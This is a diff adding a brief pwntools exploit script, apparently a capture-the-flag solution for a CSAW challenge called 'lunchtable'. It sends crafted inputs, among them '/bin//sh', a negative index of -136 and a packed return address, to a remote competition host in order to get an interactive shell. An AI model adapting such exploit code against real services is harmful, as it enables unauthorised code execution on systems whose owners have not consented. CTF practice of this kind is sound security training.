@@ -1,0 +1,16 @@
+from pwn import *
+
+#p= process('./lunchtable')
+#gdb.attach(p)
+p = remote('pwn.chal.csaw.io', 1001)
+p.sendline('a')
+p.recv()
+p.sendline('a')
+p.sendline('y')
+p.sendline('32')
+p.sendline('/bin//sh')
+p.sendline('y')
+p.sendline('-136')
+p.recv()
+p.sendline(p64(0x40085c))
+p.interactive()
